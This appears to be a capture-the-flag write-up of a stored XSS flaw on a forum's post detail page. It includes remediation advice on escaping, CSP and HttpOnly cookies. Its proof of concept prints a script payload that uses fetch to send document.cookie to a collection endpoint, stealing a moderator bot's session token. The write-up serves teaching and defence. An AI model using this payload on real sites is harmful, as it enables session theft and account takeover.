# Stored XSS in Forum Posts

## OWASP Category

[A05:2025 - Injection](https://top10.owasp.org/2025/A05_2025-Injection/)

## References

- [OWASP Cheat Sheet - Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## Summary

The forum post content is stored without any sanitization. The listing page escapes it, but the post detail page `/forum/{id}` renders it as raw HTML, so a `<script>` tag placed in a post is executed in the browser of everyone who opens it - including the moderation bot that visits the forum.

## Proof of Concept

`exploit.sh` logs in as `jdoe` and creates a post whose content is `<script>fetch("http://localhost:4942/api/collect?c=" + document.cookie)</script>`, then polls `/api/collect`. When the moderation bot (HeadlessChrome) opens the post, the script runs in its browser and sends its cookies there, where the attacker reads them: the bot's cookie contains the flag.

## Impact

The attacker can run arbitrary JavaScript in the browser of every visitor of a post and steal their cookies. The session cookie has no `HttpOnly` flag, so the stolen `document.cookie` contains the victim's session JWT, and their account (the bot is a moderator) can be fully taken over. This happens due to the post content being inserted into the detail page as raw HTML instead of escaped text.

## Remediation

Escape all user-supplied content when rendering it into HTML (the detail page is the broken one), or sanitize it and allow only safe markup.
For an additional layer of defence, add a `Content-Security-Policy` header that blocks inline scripts, and mark the session cookie as `HttpOnly` so JavaScript cannot read it.
